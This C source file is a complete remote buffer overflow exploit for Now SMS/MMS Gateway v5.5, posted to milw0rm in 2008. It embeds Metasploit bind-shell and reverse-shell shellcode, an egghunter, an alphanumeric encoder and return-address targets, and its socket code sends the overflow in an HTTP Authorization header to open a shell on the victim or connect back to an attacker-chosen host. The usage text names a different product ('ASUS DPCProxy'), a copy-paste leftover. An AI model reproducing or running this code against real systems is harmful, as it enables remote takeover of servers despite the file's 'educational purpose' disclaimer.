/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : Now SMS/MMS Gateway v5.5 and others
* ----------------------------------------
* Exploit        : Now SMS/MMS Gateway v5.5 Remote Buffer Overflow Exploit
* Exploit date   : 14.04.2008
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows ALL 
* Tested         : Windows 2000 Server
* Crew           : Dreatica-FXP
* Location       : http://www.milw0rm.com/
* ----------------------------------------
* Info           : We obtain EIP after sending a long Authentificate request to server
*                  Egghunter help here.
* ----------------------------------------
* Thanks to:
*		1. Luigi Auriemma          ( http://aluigi.org   <aluigi [at] autistici.org> )
*		2. The Metasploit project  ( http://metasploit.com                           ) 
*       3. ALPHA 2: Zero-tolerance ( <skylined [at] edup.tudelft.nl>                 ) 
*		4. Dreatica-FXP crew       (                                                 )
************************************************************************************
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>

#pragma comment(lib,"ws2_32")


void usage(char * s);
void logo();
void end_logo();
void print_info_banner_line(const char * key, const char * val);

void extract_ip_and_port( char * &remotehost, int * port, char * str);
int  fill_payload_args(int sh, int bport, char * reverseip, int reverseport, struct h2readyp * xx);
void base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len, char * ret);

int hr2_connect(char * remotehost, int port, int timeout);
int hr2_udpconnect(char * remotehost, int port,  struct sockaddr_in * addr, int timeout);
int hr2_updsend(char * remotehost, unsigned char * buf, unsigned int len, int port, struct sockaddr_in * addr, int timeout);
int execute(struct _buf * abuf, char * remotehost, int port);

struct _buf 
{
	unsigned char * ptr;
	unsigned int size;
};
int construct_shellcode(int sh, struct _buf * shf, int target,char * rerverseip, int reverseport);
int construct_buffer(struct _buf * shf, int target, struct _buf * abuf);




// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------


struct {
	const char * name;
	int length;
	char *shellcode;	
}shellcodes[]={ 	
	 {"Bindshell, port 4444   [ args: none          ]", 696, 
		 /* win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com */
		"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x37\x49\x49\x49"
		"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x42"
		"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x52\x42\x32\x42\x41\x32"
		"\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x6a\x49\x4b\x4c\x62"
		"\x4a\x68\x6b\x30\x4d\x59\x78\x49\x69\x4b\x4f\x79\x6f\x69\x6f\x71"
		"\x70\x4e\x6b\x32\x4c\x51\x34\x64\x64\x6e\x6b\x41\x55\x77\x4c\x4c"
		"\x4b\x71\x6c\x35\x55\x64\x38\x54\x41\x58\x6f\x4c\x4b\x30\x4f\x47"
		"\x68\x4e\x6b\x53\x6f\x47\x50\x74\x41\x58\x6b\x70\x49\x4c\x4b\x35"
		"\x64\x6c\x4b\x36\x61\x68\x6e\x57\x41\x79\x50\x6f\x69\x4c\x6c\x6c"
		"\x44\x4b\x70\x63\x44\x43\x37\x5a\x61\x78\x4a\x44\x4d\x36\x61\x6a"
		"\x62\x38\x6b\x78\x74\x77\x4b\x51\x44\x74\x64\x76\x48\x51\x65\x4a"
		"\x45\x4e\x6b\x73\x6f\x61\x34\x55\x51\x5a\x4b\x71\x76\x6c\x4b\x64"
		"\x4c\x72\x6b\x4e\x6b\x63\x6f\x57\x6c\x75\x51\x7a\x4b\x33\x33\x34"
		"\x6c\x6c\x4b\x6e\x69\x72\x4c\x45\x74\x45\x4c\x30\x61\x4f\x33\x50"
		"\x31\x69\x4b\x61\x74\x6c\x4b\x57\x33\x66\x50\x4e\x6b\x43\x70\x64"
		"\x4c\x6e\x6b\x32\x50\x65\x4c\x6e\x4d\x6e\x6b\x77\x30\x67\x78\x31"
		"\x4e\x33\x58\x6c\x4e\x30\x4e\x34\x4e\x5a\x4c\x50\x50\x4b\x4f\x69"
		"\x46\x72\x46\x62\x73\x70\x66\x35\x38\x57\x43\x35\x62\x45\x38\x30"
		"\x77\x63\x43\x44\x72\x71\x4f\x71\x44\x79\x6f\x4a\x70\x73\x58\x78"
		"\x4b\x48\x6d\x4b\x4c\x77\x4b\x56\x30\x79\x6f\x7a\x76\x51\x4f\x6f"
		"\x79\x79\x75\x32\x46\x4b\x31\x48\x6d\x43\x38\x45\x52\x70\x55\x73"
		"\x5a\x33\x32\x6b\x4f\x4a\x70\x72\x48\x69\x49\x36\x69\x4c\x35\x6e"
		"\x4d\x50\x57\x4b\x4f\x6a\x76\x36\x33\x36\x33\x61\x43\x33\x63\x62"
		"\x73\x43\x73\x36\x33\x50\x43\x63\x63\x4b\x4f\x68\x50\x43\x56\x71"
		"\x78\x62\x31\x51\x4c\x30\x66\x30\x53\x6b\x39\x78\x61\x4c\x55\x65"
		"\x38\x4e\x44\x67\x6a\x74\x30\x6f\x37\x70\x57\x69\x6f\x6e\x36\x32"
		"\x4a\x36\x70\x43\x61\x32\x75\x79\x6f\x4e\x30\x50\x68\x4f\x54\x6e"
		"\x4d\x64\x6e\x6d\x39\x52\x77\x79\x6f\x58\x56\x66\x33\x36\x35\x69"
		"\x6f\x4e\x30\x45\x38\x38\x65\x72\x69\x6b\x36\x77\x39\x33\x67\x79"
		"\x6f\x6e\x36\x70\x50\x31\x44\x62\x74\x73\x65\x6b\x4f\x58\x50\x6d"
		"\x43\x50\x68\x4b\x57\x44\x39\x4f\x36\x64\x39\x71\x47\x6b\x4f\x49"
		"\x46\x63\x65\x6b\x4f\x4a\x70\x71\x76\x50\x6a\x50\x64\x50\x66\x70"
		"\x68\x50\x63\x52\x4d\x6e\x69\x58\x65\x32\x4a\x46\x30\x63\x69\x45"
		"\x79\x48\x4c\x4c\x49\x7a\x47\x63\x5a\x70\x44\x4d\x59\x78\x62\x36"
		"\x51\x39\x50\x38\x73\x4f\x5a\x6b\x4e\x41\x52\x64\x6d\x6b\x4e\x32"
		"\x62\x36\x4c\x4e\x73\x4c\x4d\x43\x4a\x34\x78\x4c\x6b\x6e\x4b\x6e"
		"\x4b\x51\x78\x70\x72\x6b\x4e\x4e\x53\x47\x66\x4b\x4f\x32\x55\x50"
		"\x44\x4b\x4f\x7a\x76\x43\x6b\x70\x57\x62\x72\x46\x31\x66\x31\x32"
		"\x71\x30\x6a\x35\x51\x33\x61\x32\x71\x33\x65\x53\x61\x4b\x4f\x5a"
		"\x70\x30\x68\x6e\x4d\x6e\x39\x73\x35\x7a\x6e\x62\x73\x4b\x4f\x48"
		"\x56\x63\x5a\x6b\x4f\x59\x6f\x57\x47\x39\x6f\x6e\x30\x4e\x6b\x30"
		"\x57\x59\x6c\x4b\x33\x38\x44\x45\x34\x59\x6f\x39\x46\x50\x52\x39"
		"\x6f\x58\x50\x65\x38\x38\x70\x6e\x6a\x37\x74\x53\x6f\x31\x43\x6b"
		"\x4f\x6a\x76\x6b\x4f\x78\x50\x42"
	 },	  
	 {"ReverseShell      [ args: -R <ip:port> ]", 
		287,
		/*
		* windows/shell_reverse_tcp - 287 bytes
		* http://www.metasploit.com
		* Encoder: generic/none	
		*/	
		"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b"
		"\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01"
		"\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07"
		"\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f"
		"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b"
		"\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
		"\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff"
		"\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0"
		"\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08"
		"\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53"
		"\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68\x7f\x00\x00\x01\x66"
		"\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff"
		"\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a"
		"\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95"
		"\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab\x68"
		"\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51"
		"\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff"
		"\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04"
		"\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6"
		"\xff\xd0"
	},
	{NULL, 0, NULL}
};
 


 
struct _target{
	const char *t ;
	unsigned long ret ;
} targets[]=
{	
	{"Now SMS/MMS Gateway universal",          0x10002f9d },
	{"Now SMS/MMS Gateway v5.5",               0x0027727c },	
	{"DOS/Crash/Debug/Test/Fun",               0x41414141 },
	{NULL,                                     0x00000000 }
};


char egghunter[] = 
	"\x33\xd2\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05"
	"\x5a\x74\xef\xb8\x44\x46\x58\x50\x8b\xfa\xaf\x75\xea\xaf\x75\xe7"
	"\xff\xe7";	

char header_b[] = 
				"GET / HTTP/1.0\r\n"
				"User-Agent: ";
char header_m[] ="\r\n"
				"Authorization: Basic ";
char header_e[] = "\r\n\r\n";


// memory for buffers
unsigned char payloadbuffer[10000], a_buffer[10000];
long dwTimeout=5000;
int timeout=5000;

// alphanumeric decoder took from "ALPHA 2: Zero-tolerance." code
char alphanum_decoder[] = 
		"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
		"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41"
		"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
		"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49";
// alphanumeric encoder took from "ALPHA 2: Zero-tolerance." code
int alphanumeric_exec(char *to_encode, int len, char *encoded, int * rlen )
{
	int   i,ii=0, input, A, B, C, D, E, F, length=(int)strlen(to_encode);
	char* valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; // mixed chars
	char temp[10];
	memset(temp, 0 , sizeof(temp));	
	srand((int)clock());  
	for(ii=0;ii<len;ii++)
	{
		input = to_encode[ii];
		A = (input & 0xf0) >> 4;
		B = (input & 0x0f);
		F = B;
		i = rand() % ((int)strlen(valid_chars));
		while ((valid_chars[i] & 0x0f) != F) { i = ++i % ((int)strlen(valid_chars)); }
		E = valid_chars[i] >> 4;
		D = (A^E);
		i = rand() % ((int)strlen(valid_chars));
		while ((valid_chars[i] & 0x0f) != D) { i = ++i % ((int)strlen(valid_chars)); }
		C = valid_chars[i] >> 4;
		sprintf(temp,"%c%c", (C<<4)+D, (E<<4)+F);
		encoded[strlen(encoded)]=temp[0];
		encoded[strlen(encoded)]=temp[1];
	}
	encoded[strlen(encoded)]='A';
	*rlen=(int)strlen(encoded);
	return 1;

}

int main(int argc, char **argv)
{
	char c,*remotehost=NULL,*file=NULL,*reverseip=NULL,*url=NULL,temp1[100];
	int HAVE_R=0,HAVE_U=0,sh,port=8800,itarget=0,reverseport=9999;
	struct _buf  fshellcode, sbuffer;

	logo();
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	// set defaults
	sh=0;	
	// ------------	
	
	while((c = getopt(argc, argv, "h:t:R:T:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				if (strchr(optarg,':')==NULL)
				{
					remotehost=optarg;
				}else 
				{
					sscanf(strchr(optarg,':')+1, "%d", &port);
					remotehost=optarg;
					*(strchr(remotehost,':'))='\0';
				}
				break; 				
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'R':
				HAVE_R=1;
				if (strchr(optarg,':')==NULL)
				{
					reverseip=optarg;
				}else 
				{
					sscanf(strchr(optarg,':')+1, "%d", &reverseport);
					reverseip=optarg;
					*(strchr(reverseip,':'))='\0';
				}
				break;			
			case 'T':				
				sscanf(optarg, "%ld", &dwTimeout);
				break; 			
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		
	}	
	sh=HAVE_R;

	if(remotehost == NULL)
	{
		printf("   [-] Please enter remotehost\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	print_info_banner_line("Host", remotehost);
	sprintf(temp1, "%d", port);
	print_info_banner_line("Port", temp1);
	print_info_banner_line("Payload", shellcodes[sh].name);

	if(sh==0)
	{		
		sprintf(temp1, "%d", 4444);
		print_info_banner_line("BINDPort", temp1);
	}
	if(sh==1)
	{
		print_info_banner_line("CB IP", reverseip);
		sprintf(temp1, "%d", reverseport);
		print_info_banner_line("CB port", temp1);
	}
	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);


	memset(payloadbuffer, 0, sizeof(payloadbuffer));
	fshellcode.ptr=payloadbuffer;
	fshellcode.size=0;	

	memset(a_buffer, 0, sizeof(a_buffer));
	sbuffer.ptr=a_buffer;
	sbuffer.size=0;

	if(!construct_shellcode(sh, &fshellcode, itarget, reverseip, reverseport))
	{
		end_logo();
		WSACleanup();
		return -1;
	}

	printf("   [+] Payload constructed\n");
	
	if(!construct_buffer(&fshellcode, itarget, &sbuffer))
	{
		printf("   [-] Buffer not constructed\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	printf("   [+] Final buffer constructed\n");
	

	if(!execute(&sbuffer, remotehost, port))
	{
		printf("   [-] Buffer not sent\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	printf("   [+] Buffer sent\n");
	
	end_logo();
	WSACleanup();
	return 0;
}
int construct_shellcode(int sh, struct _buf * shf, int target, char * rerverseip, int reverseport)
{
	int x;
	char fsh[1000];

	memcpy(shf->ptr, shellcodes[sh].shellcode, shellcodes[sh].length);
	shf->size=shellcodes[sh].length;
	if(sh==1)
	{		
		memset(shf->ptr,0,shf->size+1);
		memset(fsh,0,sizeof(fsh));
		memcpy(fsh, shellcodes[sh].shellcode, shellcodes[sh].length);
		

		static struct hostent *host = gethostbyname(rerverseip);
		static struct sockaddr_in addr;
		if(host == NULL)
		{
			printf("   [-] Reverse ip/hostanme is invalid\n");
			return 0;
		}

		addr.sin_addr = *(struct in_addr*)host->h_addr;
		fsh[160] = (addr.sin_addr.S_un.S_un_b.s_b1) ;
		fsh[161] = (addr.sin_addr.S_un.S_un_b.s_b2) ;
		fsh[162] = (addr.sin_addr.S_un.S_un_b.s_b3) ;
		fsh[163] = (addr.sin_addr.S_un.S_un_b.s_b4) ;
        
		fsh[166] = ((reverseport >> 8) & 0xff) ;
		fsh[167] = ((reverseport     ) & 0xff) ;	
		
		memcpy(shf->ptr,alphanum_decoder,sizeof(alphanum_decoder)-1);
		alphanumeric_exec(fsh, shellcodes[sh].length, (char*)(shf->ptr+sizeof(alphanum_decoder)-1), &x);
		shf->size = sizeof(alphanum_decoder)-1+x;
	}
	return 1;
}

int construct_buffer(struct _buf * shf, int target, struct _buf * sbuf)
{
	unsigned char * cp, *lp ;
	char buf[10000],encoded[10000],encoded2[10000], useragent[10000];
	int len, slen;

	//
	cp=(unsigned char *)useragent;	
	*cp++ = '\x44';
	*cp++ = '\x46';
	*cp++ = '\x58';
	*cp++ = '\x50';
	*cp++ = '\x44';
	*cp++ = '\x46';
	*cp++ = '\x58';
	*cp++ = '\x50';
	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\x41';
	memcpy(cp, shf->ptr, shf->size);
	cp+=shf->size;
	slen=(int)(cp-(unsigned char *)useragent);

	
	// make egghunter
	memset(buf, 0, sizeof(buf));
	memset(encoded, 0, sizeof(encoded));
	memset(encoded2, 0, sizeof(encoded2));

	cp=(unsigned char *)buf;
	memset(cp, '\x41', 129);	
	cp+=129;	

	*cp++ = (unsigned char)((targets[target].ret      ) & 0xff);
	*cp++ = (unsigned char)((targets[target].ret >>  8) & 0xff);
	*cp++ = (unsigned char)((targets[target].ret >> 16) & 0xff);
	*cp++ = (unsigned char)((targets[target].ret >> 24) & 0xff);

	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';

	memcpy(cp, egghunter, strlen(egghunter));
	cp+=strlen(egghunter);

	memset(cp, '\x42', 500);	
	cp+=500;		
	len=(int)(cp-(unsigned char * )buf);
	base64_encode((const unsigned char *)buf,len,(char *)encoded);
	base64_encode((const unsigned char *)encoded,strlen(encoded),(char *)encoded2);
	// ---


	cp = sbuf->ptr;
	memcpy(cp, header_b,strlen(header_b));
	cp+=strlen(header_b);
	memcpy(cp, useragent,slen);
	cp+=slen;	
	memcpy(cp, header_m,strlen(header_m));
	cp+=strlen(header_m);
	memcpy(cp, encoded2,strlen(encoded2));
	cp+=strlen(encoded2);	
	memcpy(cp, header_e,strlen(header_e));
	cp+=strlen(header_e);
	
	sbuf->size=(int)(cp-sbuf->ptr);
	return 1;
}


void extract_ip_and_port( char * &remotehost, int * port, char * str)
{
	if (strchr(str,':')==NULL)
	{
		remotehost=str;
	}else 
	{
		sscanf(strchr(str,':')+1, "%d", port);
		remotehost=str;
		*(strchr(remotehost,':'))='\0';
	}
}



int hr2_connect(char * remotehost, int port, int timeout)
{
	SOCKET s;
	struct hostent *host;
	struct sockaddr_in addr;
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set x;
	int res;

	if (INFINITE != timeout) 
	{
	    stTime.tv_sec = timeout / 1000;
	    stTime.tv_usec = timeout % 1000;
	    pstTime = &stTime;
	}

	host = gethostbyname(remotehost);
	if (!host) return SOCKET_ERROR;

	addr.sin_addr = *(struct in_addr*)host->h_addr;
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == SOCKET_ERROR)
	{
		closesocket(s);
		return SOCKET_ERROR;
	}

	unsigned long l = 1;
	ioctlsocket( s, FIONBIO, &l ) ;

	connect(s, (struct sockaddr*)&addr, sizeof(addr));

	FD_ZERO(&x);
	FD_SET(s, &x);

	res = select(NULL,NULL,&x,NULL,pstTime);
	if(res< 0) return SOCKET_ERROR;
	if(res==0) return 0;
	return (int)s;
}


int hr2_tcpsend(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	return send(s, (char *)buf, len, 0);
}

int hr2_tcprecv(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set xy;
	int res;

	if (INFINITE != timeout) 
	{
	    stTime.tv_sec = timeout / 1000;
	    stTime.tv_usec = timeout % 1000;
	    pstTime = &stTime;
	}
	FD_ZERO(&xy);
	FD_SET(s, &xy);
	
	res = select(NULL,&xy,NULL,NULL,pstTime);

	if(res==0) return 0;
	if(res<0) return -1;

	return recv(s, (char *)buf, len, 0);
}

int execute(struct _buf * abuf, char * remotehost, int port)
{
	int x;
	SOCKET s ;

	s = hr2_connect(remotehost, port, 10000);
	if(s==0)
	{
		printf("   [-] connect() timeout\n");
		return 0;
	}
	if(s==SOCKET_ERROR)
	{
		printf("   [-] Connection failed\n");
		return 0;
	}		
	x = hr2_tcpsend(s, abuf->ptr, abuf->size, 0);
	printf("   [+] Sent %d out of %d bytes\n", x, abuf->size);

	closesocket(s);
	return 1;
}

// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------



// -----------------------------------------------------------------
// BASE64
// -----------------------------------------------------------------
char base64_chars[] = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";


static inline bool is_base64(unsigned char c) {
  return (isalnum(c) || (c == '+') || (c == '/'));
}

void base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len, char * ret) 
{
  int i = 0;
  int j = 0;
  unsigned char char_array_3[3];
  unsigned char char_array_4[4];

  while (in_len--) 
  {
    char_array_3[i++] = *(bytes_to_encode++);
    if (i == 3) {
      char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
      char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
      char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
      char_array_4[3] = char_array_3[2] & 0x3f;

      for(i = 0; (i <4) ; i++)
		ret[strlen(ret)]=base64_chars[char_array_4[i]];
      i = 0;
    }
  }

  if (i)
  {
    for(j = i; j < 3; j++)
      char_array_3[j] = '\0';

    char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
    char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
    char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
    char_array_4[3] = char_array_3[2] & 0x3f;

    for (j = 0; (j < i + 1); j++)
		ret[strlen(ret)]=base64_chars[char_array_4[j]];

    while((i++ < 3))
		ret[strlen(ret)]='=';

  }


}

// -----------------------------------------------------------------
// End of BASE64
// -----------------------------------------------------------------




void print_info_banner_line(const char * key, const char * val)
{
	char temp1[100], temp2[100];

	memset(temp1,0,sizeof(temp1));	
	memset(temp1, '\x20' , 58 - strlen(val) -1);	

	memset(temp2,0,sizeof(temp2));
	memset(temp2, '\x20' , 8 - strlen(key));	
	printf(" #  %s%s: %s%s# \n", key, temp2, val, temp1);	

}



void usage(char * s)
{	
	int j;
	printf("\n");
	printf("    Usage: %s -h <host:port> -t <target> -R <host:port>\n", s);
	printf("   -------------------------------------------------------------------\n");
	printf("    Arguments:\n");
	printf("      -h ........ host to attack, default port: 8800\n");
	printf("      -t ........ target to use\n");	
	printf("      -R ........ host and port for back connect\n");	
	printf("      -T ........ socket timeout\n");
	printf("\n");
	printf("    Supported ASUS DPCProxy versions:\n");
	for(j=0; targets[j].t!=0;j++)
	{
		printf("      %d. %s\n",j+1, targets[j].t);
	}					
	printf("\n");
	for(j=0; shellcodes[j].name!=0;j++)
	{
		printf("      %d. %s\n",j+1, shellcodes[j].name);
	}		
	end_logo();	
}

void logo()
{
	printf("\n\n");
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : Now SMS/MMS Gateway v5.5 Remote Buffer Overflow Exploit  # \n");
	printf(" #  Author  : Heretic2 (http://www.dreatica.cl/)                       # \n");
	printf(" #  Version : 1.0                                                      # \n");
	printf(" #  System  : Windows ALL                                              # \n");
	printf(" #  Date    : 14.04.2008                                               # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}

void end_logo()
{
	printf(" # ------------------------------------------------------------------- # \n");
	printf(" #                    Dreatica-FXP crew [Heretic2]                     # \n");	
	printf(" ####################################################################### \n\n");
}

// milw0rm.com [2008-05-29]
